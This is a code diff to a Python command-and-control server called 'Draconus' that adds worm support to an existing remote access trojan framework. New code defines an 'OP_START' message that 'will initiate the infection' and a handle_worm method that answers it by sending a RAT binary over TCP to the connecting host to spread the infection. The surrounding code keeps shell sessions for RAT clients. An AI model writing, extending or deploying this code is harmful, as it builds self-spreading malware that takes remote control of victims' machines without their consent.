@@ -1,6 +1,7 @@
 import socket
 from hive import Queen
 
+# Change this IP for your local network
 SERVER = '192.168.100.16'
 PORT = 5050
 ADDR = (SERVER, PORT)
@@ -30,6 +31,8 @@ SHELL_START = 'SHELL START'
 # message to exit the shell
 SHELL_EXIT = 'EXIT'
 
+# the message that will initiate the infection
+OP_START = 'OP_START'
 
 # This class prepare message to send via TCP
 class Msg:
@@ -102,7 +105,7 @@ class Draconus:
                 continue
             
       
-            self.handle_RAT()
+            self.handle_WORMS()
 
         self.conn.close()
         self.server.close()
@@ -151,6 +154,7 @@ class Draconus:
     def recive_output(self):
         len_out = self.recive_pocket()
         length = int(float(len_out))
+        print(f'[DRACONUS] Trying recive {length} bytes')
         output = b''
         while len(output) < length:
             chunk = self.conn.recv(length)
@@ -172,6 +176,8 @@ class Draconus:
         if who:
             if who == TYPE_RAT:
                 self.synergy = TYPE_RAT
+            elif who == TYPE_WORM:
+                self.synergy = TYPE_WORM
             else:
                 self.synergy = None
                 return False
@@ -217,6 +223,31 @@ class Draconus:
             
 
         print(f'[DRACONUS] Disconnect {self.synergy} - {self.addr[0]} ')
+
+    def handle_worm(self):
+        print(f'[DRACONUS] Starting operation with {self.synergy} ')
+        rec = self.recive_pocket()
+        if rec == OP_START:
+            print(f'[DRACONUS] Trying infect {self.addr[0]} ')
+            self.send_pocket(self.QUEEN.RAT.length)
+            with open(self.QUEEN.RAT.path, 'rb') as f:
+                self.conn.sendfile(f, 0)
+            response = self.recive_pocket()
+            print(f'[{self.synergy}] {response} ')
+
+
+        else:
+            print(f'[Draconus] Unknown command from {self.synergy} ')
+
+
+    def handle_WORMS(self):
+        if self.synergy == TYPE_RAT:
+            self.handle_RAT()
+        elif self.synergy == TYPE_WORM:
+            self.handle_worm()
+        else:
+            return False
+
                     
 
 
